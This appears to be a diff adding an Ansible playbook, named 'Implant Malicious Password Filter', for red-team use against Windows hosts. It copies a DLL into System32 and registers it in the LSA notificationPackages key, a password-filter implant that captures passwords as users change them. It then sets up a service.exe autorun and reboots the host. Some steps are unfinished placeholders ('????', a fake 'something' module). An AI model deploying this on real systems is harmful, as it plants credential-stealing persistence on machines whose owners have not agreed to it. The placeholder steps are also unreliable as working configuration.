@@ -1,0 +1,35 @@
+---
+- name: Implant Malicious Password Filter
+  hosts: windows
+  tasks:
+
+    - name: Copy libredteam.dll to System32 directory
+      win_copy:
+        src: libredteam.dll
+        dest: C:\Windows\System32\redteam.dll
+      register: copy_result
+
+    - name: Add "redteam" to LSA notificationPackages registry key
+      win_regedit:
+        path: HKLM:\System\CurrentControlSet\Control\Lsa
+        name: notificationPackages
+        state: present
+        data_type: MULTI_SZ
+        data:
+          - redteam
+        append_value: yes
+      register: registry_modification
+
+    - name: Copy service.exe to ?????
+      win_copy:
+        src: service.exe
+        dest: ????
+
+    - name: autorun for service.exe
+      something:
+        stuff: 1
+
+    - name: Restart
+      win_reboot:
+      when:
+        - copy_result.changed or registry_modification.changed
